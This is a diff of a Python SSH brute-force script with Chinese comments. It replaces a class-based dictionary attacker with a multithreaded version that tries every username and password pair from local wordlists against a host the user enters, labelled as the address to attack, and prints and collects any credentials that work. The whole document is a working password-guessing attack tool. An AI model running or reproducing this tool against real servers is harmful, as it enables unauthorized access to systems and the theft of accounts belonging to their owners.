@@ -1,54 +1,54 @@
-import os
 import paramiko
-import sys
 import threading
-import time
+threads = []  # 线程池
+thread_max = threading.BoundedSemaphore(1000000)
 
 
-class SSHThread(threading.Thread):
-    def __init__(self, ip, port, timeout, dic, LogFile):
-        threading.Thread.__init__(self)
-        self.ip = ip
-        self.port = port
-        self.dict = dic
-        self.timeout = timeout
-        self.LogFile = LogFile
+def sshbrute(user, passw, host):
+    global work
+    # 设置 flag 为 0 ，在成功登录的时候再置为 1
+    passw=str(passw)
+    try:
+        # 使用 paramiko.SSHClient 创建 ssh 对象
+        ssh = paramiko.SSHClient()
+        # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面，接受对方的公钥证书
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        # 登录 ssh，连接失败则抛出异常跳转到except并输出匹配错误的结果
+        ssh.connect(hostname=host, port=22, username=user, password=passw, timeout=1)
+        # 打印出成功登录的 用户名 和 密码
+        print("login success! User:" + user, "Pass:" + passw)
+        work+="login success! User:" + user+"Pass:" + passw
+    except:
+        # 打印出 登录失败 的 用户名 和 密码
+        print("login failed!", "user:" + user, "pass:" + passw+'\n',end='')
 
-    def run(self):
-        print("Start try ssh => %s" % self.ip)
-        username = "root"
-        try:
-            password = open(self.dict).read().split('\n')
-        except:
-            print("Open dict file `%s` error" % self.dict)
-            exit(1)
-        for pwd in password:
-            try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(self.ip, self.port, username, pwd, timeout=self.timeout)
-                print("\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd))
-                open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
-                    time.asctime(time.localtime(time.time())), self.ip, self.port, username, pwd))
-                break
-            except:
-                print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
-                pass
+def multi_ssh(tempuser,temppasswd,target):#多线程
+    userfile=tempuser.readlines()
+    passwdfile = temppasswd.readlines()
+    for a in userfile:
+        for i in passwdfile:
+            thread_max.acquire()
+            t = threading.Thread(target=sshbrute, args=(a.replace('\n',''),i.replace('\n',''),target,))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
 
-
-def ViolenceSSH(ip, port, timeout, dic, LogFile):
-    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
-    ssh_scan.start()
-
-
-def main(ip, dic, log):
-    threading.Thread(target=ViolenceSSH, args=(ip, 22, 1, dic, log,)).start()
 
 
 def begin():
-    fpath = os.path.dirname(os.path.abspath('__file__'))
-    ip = input("请输入攻击的ip地址")
-    dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "\密码库.txt"
-    log = sys.argv[3] if len(sys.argv) > 3 else fpath + "\配对成功的ip密码.txt"
-    main(ip, dic, log)
+    global work
+    target=input(' 请输入需要ssh爆破的地址:')
+    tempuser=open('用户名.txt','r')
+    temppasswd = open('密码库.txt', 'r')
+    multi_ssh(tempuser,temppasswd,target)
+    print(work)
 
+
+work = ''
+'''对print加锁,防止输出混乱'''
+_print = print
+mutex = threading.Lock()
+def print(text, *args, **kw):
+    with mutex:
+        _print(text, *args, **kw)
